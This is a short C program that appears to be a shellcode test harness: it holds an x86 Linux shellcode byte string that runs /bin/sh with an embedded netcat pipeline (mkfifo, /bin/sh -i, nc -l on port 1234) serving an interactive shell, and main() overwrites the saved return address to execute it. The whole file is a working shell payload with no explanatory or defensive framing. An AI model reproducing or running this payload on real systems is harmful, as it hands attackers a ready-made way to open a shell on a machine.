#ifdef X64
  #define WORD long
#else
  #define WORD int
#endif

char shellcode[] =
"\x31\xc0\x66\xb8\x2d\x63\x50\x89\xe7\x99\x52\xeb\x2f\x8b\x34\x24\xeb\x01\x46\x80\x3e\x23\x75\xfa\x88\x16\x57\x83\xec\x04\x8d\x5c\x24\xf8\x89\x1c\x24\x89\xe1\x68\x2f\x73\x68\xff\x88\x54\x24\x03\x68\x2f\x62\x69\x6e\x66\x31\xc0\xb0\x0b\xcd\x80\xe8\xcc\xff\xff\xff\
rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f; rm -f /tmp/f\
#";

int main()
{
  WORD *ret;
  ret = (WORD *) &ret + 2; /* Saved IP */
  (*ret) = (WORD) shellcode;
  return 0;
}
